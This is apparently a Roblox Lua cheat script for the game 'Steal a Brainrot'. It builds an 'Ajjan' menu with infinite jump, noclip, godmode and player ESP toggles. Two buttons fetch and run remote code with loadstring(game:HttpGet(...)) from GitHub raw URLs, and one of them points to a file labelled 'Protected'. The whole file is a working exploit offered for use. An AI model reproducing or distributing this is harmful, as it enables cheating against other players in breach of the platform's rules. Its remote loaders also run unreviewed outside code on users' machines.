<meta name='viewport' content='width=device-width, initial-scale=1'/>local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local gui = Instance.new("ScreenGui")
gui.Name = "AjjanGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local openButton = Instance.new("TextButton")
openButton.Name = "AXSButton"
openButton.Text = "Ajjan"
openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
openButton.TextSize = 14
openButton.Font = Enum.Font.GothamBold
openButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
openButton.BorderSizePixel = 0
openButton.Size = UDim2.new(0, 50, 0, 50)
openButton.Position = UDim2.new(0.5, -25, 0.5, -25)
openButton.Parent = gui
Instance.new("UICorner", openButton).CornerRadius = UDim.new(1, 0)

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Size = UDim2.new(0, 300, 0, 400)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
mainFrame.Visible = false
mainFrame.Parent = gui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0.05, 0)

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Text = "Steal a Brainrot | Ajjan"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 14
titleText.Font = Enum.Font.GothamBold
titleText.BackgroundTransparency = 1
titleText.Size = UDim2.new(1, 0, 1, 0)
titleText.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 14
closeButton.Font = Enum.Font.GothamBold
closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeButton.BorderSizePixel = 0
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -30, 0, 0)
closeButton.Parent = titleBar
Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0.1, 0)

local tabButtons = Instance.new("Frame")
tabButtons.Size = UDim2.new(1, 0, 0, 40)
tabButtons.Position = UDim2.new(0, 0, 0, 30)
tabButtons.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
tabButtons.Parent = mainFrame

local tabsContainer = Instance.new("Frame")
tabsContainer.Size = UDim2.new(1, -20, 1, 0)
tabsContainer.Position = UDim2.new(0, 10, 0, 0)
tabsContainer.BackgroundTransparency = 1
tabsContainer.Parent = tabButtons

local tabs = {"Main", "Visual", "Misc"}
local tabFrames = {}

for i, name in ipairs(tabs) do
	local tabButton = Instance.new("TextButton")
	tabButton.Text = name
	tabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
	tabButton.TextSize = 14
	tabButton.Font = Enum.Font.GothamBold
	tabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	tabButton.BorderSizePixel = 0
	tabButton.Size = UDim2.new(0.3, -5, 1, -10)
	tabButton.Position = UDim2.new((i - 1) * 0.33, 0, 0, 5)
	tabButton.Parent = tabsContainer

	local frame = Instance.new("ScrollingFrame")
	frame.Name = name .. "Frame"
	frame.Size = UDim2.new(1, -20, 1, -80)
	frame.Position = UDim2.new(0, 10, 0, 80)
	frame.CanvasSize = UDim2.new(0, 0, 0, 300)
	frame.ScrollBarThickness = 5
	frame.BackgroundTransparency = 1
	frame.Visible = i == 1
	frame.Parent = mainFrame

	tabFrames[name] = frame
end

for _, btn in ipairs(tabsContainer:GetChildren()) do
	if btn:IsA("TextButton") then
		btn.MouseButton1Click:Connect(function()
			for name, frame in pairs(tabFrames) do
				frame.Visible = (name == btn.Text)
			end
		end)
	end
end

local function createButton(parent, text, posY, callback)
	local btn = Instance.new("TextButton")
	btn.Text = text
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.TextSize = 16
	btn.Font = Enum.Font.GothamBold
	btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	btn.BorderSizePixel = 0
	btn.Size = UDim2.new(1, 0, 0, 30)
	btn.Position = UDim2.new(0, 0, 0, posY)
	btn.Parent = parent
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
	if callback then
		btn.MouseButton1Click:Connect(callback)
	end
	return btn
end

local infJump = false
local infBtn = createButton(tabFrames.Main, "Infinite Jump", 10, function()
	infJump = not infJump
	infBtn.BackgroundColor3 = infJump and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 60)
end)

UserInputService.JumpRequest:Connect(function()
	if infJump and player.Character then
		local hum = player.Character:FindFirstChildOfClass("Humanoid")
		if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
	end
end)

local noclip = false
local noclipBtn = createButton(tabFrames.Main, "Noclip", 50, function()
	noclip = not noclip
	noclipBtn.BackgroundColor3 = noclip and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 60)
end)

RunService.Stepped:Connect(function()
	if noclip and player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.CanCollide = false
			end
		end
	end
end)

local godmode = false
local godBtn = createButton(tabFrames.Main, "Godmode", 90, function()
	godmode = not godmode
	godBtn.BackgroundColor3 = godmode and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 60)
end)

RunService.Heartbeat:Connect(function()
	if godmode and player.Character then
		local hum = player.Character:FindFirstChildOfClass("Humanoid")
		if hum then
			if hum.Health < hum.MaxHealth then hum.Health = hum.MaxHealth end
			if not hum:FindFirstChild("NoDamage") then
				local tag = Instance.new("BoolValue")
				tag.Name = "NoDamage"
				tag.Parent = hum
			end
		end
	end
end)

createButton(tabFrames.Main, "Instant Steal", 130, function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/onliengamerop/Steal-a-brainrot/refs/heads/main/Protected_5330862552394213.lua.txt"))()
end)

createButton(tabFrames.Main, "Tween to base (soon)", 170)
createButton(tabFrames.Main, "Auto base lock (soon)", 210)

local espEnabled = false
local espBtn = Instance.new("TextButton", tabFrames.Visual)
espBtn.Size = UDim2.new(1, -20, 0, 40)
espBtn.Position = UDim2.new(0, 10, 0, 10)
espBtn.Text = "ESP"
espBtn.Font = Enum.Font.GothamBold
espBtn.TextSize = 16
espBtn.TextColor3 = Color3.new(1, 1, 1)
espBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Instance.new("UICorner", espBtn).CornerRadius = UDim.new(0, 8)

local function createESP(plr)
	if plr == player then return end
	local char = plr.Character
	if not char then return end
	local head = char:FindFirstChild("Head")
	if not head or head:FindFirstChild("ESP") then return end

	local tag = Instance.new("BillboardGui", head)
	tag.Name = "ESP"
	tag.Size = UDim2.new(0, 100, 0, 30)
	tag.AlwaysOnTop = true

	local label = Instance.new("TextLabel", tag)
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = plr.Name
	label.TextColor3 = Color3.new(1, 0, 0)
	label.TextStrokeTransparency = 0.5
	label.TextScaled = true
end

espBtn.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled
	espBtn.BackgroundColor3 = espEnabled and Color3.fromRGB(30, 200, 30) or Color3.fromRGB(50, 50, 80)
	for _, plr in pairs(game.Players:GetPlayers()) do
		if espEnabled then
			createESP(plr)
		else
			local char = plr.Character
			if char and char:FindFirstChild("Head") then
				local esp = char.Head:FindFirstChild("ESP")
				if esp then esp:Destroy() end
			end
		end
	end
end)

createButton(tabFrames.Misc, "ServerHop", 90, function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/Secrets%20finder.lua"))()
end)

local miscText = Instance.new("TextLabel", tabFrames.Misc)
miscText.Size = UDim2.new(1, -20, 0, 60)
miscText.Position = UDim2.new(0, 10, 0, 10)
miscText.BackgroundTransparency = 1
miscText.Font = Enum.Font.Gotham
miscText.TextSize = 16
miscText.TextColor3 = Color3.new(1, 1, 1)
miscText.TextWrapped = true

RunService.RenderStepped:Connect(function()
	miscText.Text = "🕒 " .. os.date("%H:%M:%S")
end)

local function makeDraggable(frame)
	local dragging, dragInput, startPos, dragStart
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end

makeDraggable(mainFrame)
makeDraggable(openButton)

local function toggleGUI(visible)
	if visible then
		mainFrame.Visible = true
		TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 300, 0, 400)}):Play()
	else
		local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 0, 0, 0)})
		tween:Play()
		tween.Completed:Connect(function()
			mainFrame.Visible = false
		end)
	end
end

openButton.MouseButton1Click:Connect(function()
	toggleGUI(true)
end)

closeButton.MouseButton1Click:Connect(function()
	toggleGUI(false)
end)
